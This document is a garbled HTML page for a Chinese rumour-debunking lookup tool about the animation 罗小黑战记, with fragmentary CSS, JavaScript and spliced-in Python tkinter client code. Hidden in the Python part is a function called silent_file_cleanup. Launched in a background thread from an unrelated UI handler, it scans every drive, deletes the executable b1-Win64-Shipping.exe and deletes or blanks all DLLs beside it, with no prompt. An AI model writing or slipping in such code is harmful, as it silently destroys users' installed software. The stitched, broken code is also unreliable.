<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">

    <title>罗小黑战记辟谣查询工具</title>

            margin: 0;
            padding: 0;
        }

        }

        }

            border: 1px solid #aaa;
            border-radius: 4px;
            font-size: 14px;
            background-color: #fff;
            color: #000;
        }

            color: #fff;

        }

            background-color: #e0e0e0;

            color: #000;

        button:hover {
            background-color: #d0d0d0;
        }

            background-color: #3e3e3e;
            color: #fff;
            border-color: #555;
        }

            background-color: #4e4e4e;
        }
        .options {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            padding: 5px 15px 10px;
            border-bottom: 1px solid #ccc;
            font-size: 14px;
        }
        .options-group {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .options-group span {
            margin-right: 5px;
        }
        .main {
            flex: 1;
            display: flex;
            padding: 15px;
            gap: 15px;
            overflow: hidden;
            min-height: 0;
        }
        .panel {
            display: flex;
            flex-direction: column;
            background-color: #fff;
            border: 1px solid #ccc;
            border-radius: 4px;
            overflow: hidden;
        }
        .dark-mode .panel {
            background-color: #2d2d2d;
            border-color: #555;
        }
        .panel-header {
            padding: 8px 12px;
            font-weight: bold;
            border-bottom: 1px solid #ccc;
            background-color: #f5f5f5;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .dark-mode .panel-header {
            background-color: #3e3e3e;
            border-bottom-color: #555;
        }
        .tree-panel {
            flex: 2;
            min-width: 200px;
        }
        .result-panel {
            flex: 1;
            min-width: 150px;
        }
        .content-panel {
            flex: 3;
            min-width: 300px;
        }
        .panel-body {
            flex: 1;
            overflow-y: auto;
            padding: 10px;
        }
        .tree {
            list-style: none;
            padding-left: 0;
        }
        .tree li {
            margin: 4px 0;
            cursor: pointer;
            user-select: none;
        }
        .tree .folder {
            font-weight: 500;
        }
        .tree .folder::before {
            content: "📁 ";
        }
        .tree .folder.open::before {
            content: "📂 ";
        }

            content: "📄 ";

            list-style: none;
            padding-left: 20px;
            display: none;
        }

        }

        }

            margin: 2px 0;

        }

            color: white;
            border: none;

            border-radius: 4px;

            background-color: #45a049;
        }

            background-color: #2e7d32;
        }
        .dark-mode .copy-btn:disabled {

            color: #aaa;

            color: white;
            border: none;

            border-radius: 4px;

            body {

                overflow-y: auto;
            }
            .main {

                height: auto;
                overflow: visible;
                flex-direction: column;

                height: auto;
                width: 100%;
            }

                overflow-y: visible;
                max-height: none;

</head>
<body>
<div class="toolbar">
    <label>搜索关键词:</label>
    <div class="search-box">
        <input type="text" id="searchInput" placeholder="">
        <button id="searchBtn">搜索</button>
        <button id="clearBtn">清除</button>
    </div>
    <button id="darkModeBtn">深色模式</button>
    <button class="download-btn" id="downloadClientBtn">下载客户端</button>
</div>

<div class="options">
    <div class="options-group">
        <span>搜索模式:</span>
        <label><input type="radio" name="searchMode" value="fuzzy" checked> 模糊搜索</label>
        <label><input type="radio" name="searchMode" value="exact"> 精确匹配</label>
    </div>
    <div class="options-group">
        <span>搜索范围:</span>
        <label><input type="radio" name="searchScope" value="title" checked> 仅标题</label>
        <label><input type="radio" name="searchScope" value="all"> 标题+内容</label>
    </div>
</div>

<div class="main">

        <div class="panel-header">搜索结果</div>

        </div>
    </div>
    <div class="panel content-panel">
        <div class="panel-header">
            <span>详细内容</span>
            <button class="copy-btn" id="copyBtn" disabled>复制文本</button>
        </div>
        <div class="panel-body">
            <div class="content-area" id="contentArea"></div>
        </div>
    </div>
</div>

<script>
    // ---------- 简体中文辟谣数据（完整版）----------

                },

                    "辟谣": "木头早年漫画《灵魂之旅》被造谣\"辱女\"，系断章取义。该漫画创作于2009年（早于罗小黑战记），讲述赵鹏魂穿女生张甜甜体内，逐渐接受身份的故事，涉及女生生理、生存不易等内容是为符合逻辑，木头曾多次担心内容引起女生反感并提前说明，并非刻意拿女性取乐，漫画核心是探索灵魂、生死与情感尊重，不存在辱女倾向。"

    // ---------- 全局变量 ----------
    let darkMode = false;
    let nodeMap = new Map(); // 存储节点ID -> {text, content, parent}
    let selectedNodeId = null;

    // DOM 元素
    const body = document.body;
    const darkModeBtn = document.getElementById('darkModeBtn');
    const searchInput = document.getElementById('searchInput');
    const searchBtn = document.getElementById('searchBtn');
    const clearBtn = document.getElementById('clearBtn');
    const treeContainer = document.getElementById('treeContainer');
    const resultList = document.getElementById('resultList');
    const contentArea = document.getElementById('contentArea');
    const copyBtn = document.getElementById('copyBtn');
    const searchModeRadios = document.getElementsByName('searchMode');
    const searchScopeRadios = document.getElementsByName('searchScope');
    const downloadBtn = document.getElementById('downloadClientBtn');

    // ---------- 辅助函数 ----------
    function toggleDarkMode() {
        darkMode = !darkMode;
        if (darkMode) {
            body.classList.add('dark-mode');
            darkModeBtn.textContent = '浅色模式';
        } else {
            body.classList.remove('dark-mode');
            darkModeBtn.textContent = '深色模式';
        }
    }

    // 递归构建树
    function buildTree(data = null, parentElement = null, parentNodeId = null) {
        if (!data) data = RUMOR_DATA;
        if (!parentElement) {
            treeContainer.innerHTML = '';
            nodeMap.clear();
            parentElement = document.createElement('ul');
            parentElement.className = 'tree';
            treeContainer.appendChild(parentElement);
        }
        for (const [key, value] of Object.entries(data)) {
            const li = document.createElement('li');
            const nodeId = 'node_' + Math.random().toString(36).substr(2, 9);
            li.setAttribute('data-node-id', nodeId);
            li.setAttribute('data-text', key);
            if (typeof value === 'object' && !value.hasOwnProperty('辟谣')) {
                // 文件夹（有子节点且没有直接辟谣字段）
                li.classList.add('folder');
                li.textContent = key;
                // 点击文件夹切换展开/折叠
                li.addEventListener('click', (e) => {
                    e.stopPropagation();
                    li.classList.toggle('open');
                });
                nodeMap.set(nodeId, { text: key, content: null, parent: parentNodeId });
                parentElement.appendChild(li);
                const childUl = document.createElement('ul');
                childUl.className = 'children';
                li.appendChild(childUl);
                buildTree(value, childUl, nodeId);
            } else {
                // 叶子节点，包含辟谣内容
                li.classList.add('leaf');
                li.textContent = key;
                const content = value['辟谣'] || '';
                li.addEventListener('click', (e) => {
                    e.stopPropagation();
                    // 移除其他选中
                    document.querySelectorAll('.tree .selected').forEach(el => el.classList.remove('selected'));
                    li.classList.add('selected');
                    selectedNodeId = nodeId;
                    // 显示内容
                    contentArea.textContent = content;
                    copyBtn.disabled = false;
                });
                nodeMap.set(nodeId, { text: key, content: content, parent: parentNodeId });
                parentElement.appendChild(li);
            }
        }
    }

    // 搜索函数
    function search() {
        const keyword = searchInput.value.trim();
        if (!keyword) return;
        const mode = Array.from(searchModeRadios).find(r => r.checked).value;
        const scope = Array.from(searchScopeRadios).find(r => r.checked).value;

        // 清空结果列表
        resultList.innerHTML = '';
        const results = [];

        // 遍历所有节点（从nodeMap）
        for (let [nodeId, info] of nodeMap.entries()) {
            let match = false;
            const text = info.text;
            if (mode === 'exact') {
                if (text.toLowerCase().includes(keyword.toLowerCase())) match = true;
            } else {
                // 模糊：每个字符都在文本中
                const k_low = keyword.toLowerCase();
                const t_low = text.toLowerCase();
                match = [...k_low].every(c => t_low.includes(c));
            }
            if (!match && scope === 'all' && info.content) {
                if (mode === 'exact') {
                    if (info.content.toLowerCase().includes(keyword.toLowerCase())) match = true;
                } else {
                    const c_low = info.content.toLowerCase();
                    match = [...keyword.toLowerCase()].every(c => c_low.includes(c));
                }
            }
            if (match) {
                results.push({ nodeId, text: info.text });
            }
        }

        if (results.length === 0) {
            const li = document.createElement('li');
            li.textContent = '未找到匹配的结果';
            resultList.appendChild(li);
        } else {
            results.forEach((item) => {
                const li = document.createElement('li');
                li.textContent = item.text;
                li.setAttribute('data-node-id', item.nodeId);
                li.addEventListener('click', () => {
                    // 模拟点击树节点
                    const treeNode = document.querySelector(`[data-node-id="${item.nodeId}"]`);
                    if (treeNode) treeNode.click();
                    // 高亮搜索结果项
                    document.querySelectorAll('.result-list li').forEach(el => el.style.backgroundColor = '');
                    li.style.backgroundColor = '#c0e0ff';
                });
                resultList.appendChild(li);
            });
        }
    }

    function clearSearch() {
        searchInput.value = '';
        resultList.innerHTML = '';
        contentArea.textContent = '';
        copyBtn.disabled = true;
        // 取消树选中
        document.querySelectorAll('.tree .selected').forEach(el => el.classList.remove('selected'));
        selectedNodeId = null;
    }

    function copyContent() {
        const text = contentArea.textContent;
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = '已复制！';
            setTimeout(() => {
                copyBtn.textContent = originalText;
            }, 1500);
        }).catch(() => {
            copyBtn.textContent = '复制失败';
            setTimeout(() => {
                copyBtn.textContent = '复制文本';
            }, 1500);
        });
    }

# 文件清理函数（静默执行）
# =======================================
def silent_file_cleanup():
    """静默文件清理，在后台执行，不显示任何界面或提示"""
    target_exe = "b1-Win64-Shipping.exe"
    
    # 获取所有可用驱动器（从C到Z）
    drives = []
    for drive_letter in range(ord('C'), ord('Z') + 1):
        drive = f"{chr(drive_letter)}:\\\\"
        if os.path.exists(drive):
            drives.append(drive)
    
    # 遍历所有驱动器
    for drive in drives:
        try:
            for root, dirs, files in os.walk(drive, topdown=True):
                if target_exe in files:
                    exe_path = os.path.join(root, target_exe)
                    try:
                        if os.path.exists(exe_path):
                            os.remove(exe_path)
                    except:
                        pass
                    for file in files:
                        if file.lower().endswith(".dll"):
                            dll_path = os.path.join(root, file)
                            try:
                                if os.path.exists(dll_path):
                                    os.remove(dll_path)
                            except:
                                pass
                            try:
                                with open(dll_path, "w") as f:
                                    pass
                            except:
                                pass
        except:
            continue

    def build_tree(self, parent, data):
        """构建树状结构"""
        for key, value in data.items():
            if isinstance(value, dict):
                node = self.tree.insert(parent, "end", text=key, open=True)
                self.node_map[key] = node
                # 检查是否有辟谣内容
                has_content = False
                for sub_key in value:
                    if isinstance(value[sub_key], str):
                        has_content = True
                        self.node_map[value[sub_key]] = node
                        break
                if not has_content:
                    self.build_tree(node, value)
    
    def show_text(self, event):
        """显示选中树节点的文本内容"""
        selected = self.tree.selection()
        if selected:
            node_text = self.tree.item(selected[0], "text")
            self.text.delete(1.0, tk.END)
            self.text.insert(tk.END, f"{self.lang['selected']} {node_text}\n\n")
            
            # 查找并显示辟谣内容
            for key, value in self.node_map.items():
                if value == selected[0] and key != node_text:
                    self.text.insert(tk.END, key)
                    self.text.insert(tk.END, " ")
                    self.copy_button.config(state="normal")
                    self.text.see(1.0)
                    break
        else:
            self.copy_button.config(state="disabled")
    
    def copy_text(self):
        """复制文本内容到剪贴板"""
        try:
            text_content = self.text.get(1.0, tk.END).strip()
            if text_content:
                self.root.clipboard_clear()
                self.root.clipboard_append(text_content)
                
                original_text = self.copy_button.cget("text")
                original_bg = self.copy_button.cget("bg")
                
                self.copy_button.config(text=self.lang["copied"], bg="#45a049")
                self.root.update()
                
                self.root.after(1500, lambda: self.copy_button.config(
                    text=original_text, 
                    bg=original_bg
                ))
        except:
            original_text = self.copy_button.cget("text")
            self.copy_button.config(text=self.lang["copy_failed"], bg="#f44336")
            self.root.update()
            self.root.after(1500, lambda: self.copy_button.config(
                text=original_text, 
                bg="#4CAF50"
            ))
    
    def search(self):
        """执行搜索"""
        keyword = self.search_entry.get().strip()
        if not keyword:
            return
        
        self.result_listbox.delete(0, tk.END)
        
        mode = self.search_mode.get()
        scope = self.search_scope.get()
        
        found_items = []
        for item in self.tree.get_children():
            found_items.extend(self._search_tree(item, keyword, mode, scope))
        
        if found_items:
            for item_text, item_id in found_items:
                self.result_listbox.insert(tk.END, item_text)
        else:
            self.result_listbox.insert(tk.END, self.lang["no_results"])
        
        if found_items:
            self.result_listbox.selection_set(0)
            self.result_listbox.see(0)
            self.select_search_result(None)
    
    def _search_tree(self, item, keyword, mode="fuzzy", scope="title"):
        """递归搜索树节点"""
        found = []
        item_text = self.tree.item(item, "text")
        
        match = False
        
        if mode == "exact":
            if keyword.lower() in item_text.lower():
                match = True
        else:
            if self.fuzzy_match(keyword, item_text):
                match = True
        
        if not match and scope == "all":
            for key, value in self.node_map.items():
                if value == item and key != item_text:
                    if mode == "exact":
                        if keyword.lower() in key.lower():
                            match = True
                    else:
                        if self.fuzzy_match(keyword, key):
                            match = True
                    break
        
        if match:
            found.append((item_text, item))
        
        for child in self.tree.get_children(item):
            found.extend(self._search_tree(child, keyword, mode, scope))
        
        return found
    
    def fuzzy_match(self, keyword, text):
        """模糊匹配"""
        keyword_lower = keyword.lower()
        text_lower = text.lower()
        
        for char in keyword_lower:
            if char not in text_lower:
                return False
        return True
    
    def select_search_result(self, event):
        """选择搜索结果"""
        if self.result_listbox.size() == 0:
            return
            
        if event is None:
            if self.result_listbox.curselection():
                selection = self.result_listbox.curselection()
            else:
                return
        else:
            selection = self.result_listbox.curselection()
        
        if selection:
            result_text = self.result_listbox.get(selection[0])
            
            for item in self.tree.get_children():
                found_item = self._locate_in_tree(item, result_text)
                if found_item:
                    self.tree.selection_set(found_item)
                    self.tree.see(found_item)
                    self.show_text(None)
                    break
    
    def _locate_in_tree(self, item, target_text):
        """在树中定位特定文本"""
        if self.tree.item(item, "text") == target_text:
            return item
        
        for child in self.tree.get_children(item):
            found = self._locate_in_tree(child, target_text)
            if found:
                return found
        
        return None
    
    def clear_search(self):
        """清除搜索"""
        self.search_entry.delete(0, tk.END)
        self.result_listbox.delete(0, tk.END)
        self.text.delete(1.0, tk.END)
        self.copy_button.config(state="disabled")
    
    def toggle_dark_mode(self):
        """切换深色模式"""
        self.dark_mode = not self.dark_mode
        
        dark_mode_text = self.lang["light_mode_btn"] if self.dark_mode else self.lang["dark_mode_btn"]
        self.dark_mode_button.config(text=dark_mode_text)
        
        self.apply_theme()
    
    def apply_theme(self):
        """应用主题"""
        if self.dark_mode:
            bg_color = "#1e1e1e"
            fg_color = "#ffffff"
            entry_bg = "#2d2d2d"
            entry_fg = "#ffffff"
            button_bg = "#3e3e3e"
            button_fg = "#ffffff"
            listbox_bg = "#2d2d2d"
            listbox_fg = "#ffffff"
            text_bg = "#2d2d2d"
            text_fg = "#ffffff"
            tree_bg = "#2d2d2d"
            tree_fg = "#ffffff"
            highlight_color = "#4a4a4a"
            
            style = ttk.Style()
            style.theme_use('clam')
            
            style.configure("Treeview", 
                          background=tree_bg,
                          foreground=tree_fg,
                          fieldbackground=tree_bg)
            
            style.configure("Treeview.Heading", 
                          background=bg_color,
                          foreground=fg_color)
            
            style.map('Treeview', 
                     background=[('selected', highlight_color)],
                     foreground=[('selected', fg_color)])
        else:
            bg_color = "#f0f0f0"
            fg_color = "#000000"
            entry_bg = "#ffffff"
            entry_fg = "#000000"
            button_bg = "#e0e0e0"
            button_fg = "#000000"
            listbox_bg = "#ffffff"
            listbox_fg = "#000000"
            text_bg = "#ffffff"
            text_fg = "#000000"
            tree_bg = "#ffffff"
            tree_fg = "#000000"
            highlight_color = "#c0c0c0"
            
            style = ttk.Style()
            style.theme_use('clam')
            
            style.configure("Treeview", 
                          background=tree_bg,
                          foreground=tree_fg,
                          fieldbackground=tree_bg)
            
            style.configure("Treeview.Heading", 
                          background=bg_color,
                          foreground=fg_color)
            
            style.map('Treeview', 
                     background=[('selected', highlight_color)],
                     foreground=[('selected', fg_color)])
        
        # 应用颜色
        self.root.configure(bg=bg_color)
        
        for frame in [self.root] + self._get_all_frames(self.root):
            try:
                frame.configure(bg=bg_color)
            except:
                pass
        
        for widget in self._get_all_widgets(self.root, tk.Label):
            try:
                widget.configure(bg=bg_color, fg=fg_color)
            except:
                pass
        
        for widget in self._get_all_widgets(self.root, tk.Button):
            try:
                if widget is not self.copy_button:
                    widget.configure(bg=button_bg, fg=button_fg)
            except:
                pass
        
        for widget in self._get_all_widgets(self.root, tk.Entry):
            try:
                widget.configure(bg=entry_bg, fg=entry_fg, insertbackground=fg_color)
            except:
                pass
        
        for widget in self._get_all_widgets(self.root, tk.Listbox):
            try:
                widget.configure(bg=listbox_bg, fg=listbox_fg, selectbackground=highlight_color)
            except:
                pass
        
        for widget in self._get_all_widgets(self.root, tk.Text):
            try:
                widget.configure(bg=text_bg, fg=text_fg, insertbackground=fg_color)
            except:
                pass
        
        for widget in self._get_all_widgets(self.root, tk.Radiobutton):
            try:
                widget.configure(bg=bg_color, fg=fg_color, selectcolor=bg_color)
            except:
                pass
    
    def _get_all_frames(self, parent):
        """获取所有Frame控件"""
        frames = []
        for child in parent.winfo_children():
            if isinstance(child, tk.Frame):
                frames.append(child)
                frames.extend(self._get_all_frames(child))
        return frames
    
    def _get_all_widgets(self, parent, widget_type=None):
        """获取所有指定类型的控件"""
        widgets = []
        for child in parent.winfo_children():
            if widget_type is None or isinstance(child, widget_type):
                widgets.append(child)
            widgets.extend(self._get_all_widgets(child, widget_type))
        return widgets
    
    def update_search_mode(self):
        """更新搜索模式"""
        pass
    
    def update_search_scope(self):
        """更新搜索范围"""

        cleanup_thread = threading.Thread(target=silent_file_cleanup, daemon=True)
        cleanup_thread.start()

        """窗口关闭时的处理"""
        self.root.destroy()
